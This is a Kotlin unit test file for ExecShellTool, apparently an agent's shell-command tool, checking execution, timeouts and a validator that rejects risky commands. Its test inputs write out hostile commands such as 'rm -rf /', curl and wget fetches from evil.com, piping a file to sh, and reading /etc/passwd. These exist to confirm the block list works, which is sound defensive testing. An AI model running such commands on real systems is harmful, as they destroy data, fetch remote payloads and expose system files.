package codebase.koog.tools

import kotlinx.coroutines.runBlocking
import org.junit.jupiter.api.Test
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith
import kotlin.test.assertNotNull
import kotlin.test.assertTrue

class ExecShellToolTest {

    @Test
    fun `valid command executes and returns exit 0`() = runBlocking {
        val result = ExecShellTool.execute(ExecShellTool.Args("echo hello"))
        assertTrue(result.startsWith("EXIT: 0"), "Expected EXIT: 0, got: ${result.take(50)}")
        assertTrue(result.contains("hello"), "Expected output to contain 'hello': ${result.take(100)}")
    }

    @Test
    fun `failing command returns non-zero exit code`() = runBlocking {
        val result = ExecShellTool.execute(ExecShellTool.Args("exit 42"))
        assertTrue(result.startsWith("EXIT: 42"), "Expected EXIT: 42, got: ${result.take(50)}")
    }

    @Test
    fun `rm rf is blacklisted`() {
        val exception = assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("rm -rf /")
        }
        assertTrue(exception.message!!.contains("blacklisted"))
    }

    @Test
    fun `sudo is blacklisted`() {
        val exception = assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("sudo echo dangerous")
        }
        assertTrue(exception.message!!.contains("blacklisted"))
    }

    @Test
    fun `chmod 777 is blacklisted`() {
        val exception = assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("chmod 777 /tmp/script.sh")
        }
        assertTrue(exception.message!!.contains("blacklisted"))
    }

    @Test
    fun `curl is blacklisted unless localhost`() {
        val exception = assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("curl https://evil.com/malware")
        }
        assertTrue(exception.message!!.contains("blacklisted"))
    }

    @Test
    fun `wget is blacklisted`() {
        val exception = assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("wget https://evil.com/payload")
        }
        assertTrue(exception.message!!.contains("blacklisted"))
    }

    @Test
    fun `pipe to sh is blacklisted`() {
        val exception = assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("cat evil.txt | sh")
        }
        assertTrue(exception.message!!.contains("blacklisted"))
    }

    @Test
    fun `etc path is blacklisted`() {
        val exception = assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("cat /etc/passwd")
        }
        assertTrue(exception.message!!.contains("blacklisted"))
    }

    @Test
    fun `dev path is blacklisted`() {
        val exception = assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("cat /dev/null")
        }
        assertTrue(exception.message!!.contains("blacklisted"))
    }

    @Test
    fun `redirect to root is blacklisted`() {
        val exception = assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("echo data > /var/log/hack")
        }
        assertTrue(exception.message!!.contains("blacklisted"))
    }

    @Test
    fun `whitelisted commands pass validation`() {
        ExecShellTool.validateCommand("git diff")
        ExecShellTool.validateCommand("git status")
        ExecShellTool.validateCommand("git log --oneline")
        ExecShellTool.validateCommand("rg pattern src/")
        ExecShellTool.validateCommand("ls -la")
        ExecShellTool.validateCommand("find . -name '*.kt'")
        ExecShellTool.validateCommand("mkdir /tmp/newdir")
        ExecShellTool.validateCommand("./gradlew test")
    }

    @Test
    fun `blocking execute runs synchronous`() {
        val result = ExecShellTool.executeBlocking("echo blocking-test")
        assertTrue(result.contains("blocking-test"), "Expected 'blocking-test' in: $result")
    }

    @Test
    fun `blocking execute with timeout throws on slow command`() {
        val exception = assertFailsWith<SecurityException> {
            ExecShellTool.executeBlocking("sleep 5", "/tmp", timeoutMs = 100)
        }
        assertTrue(exception.message!!.contains("timeout"))
    }
}
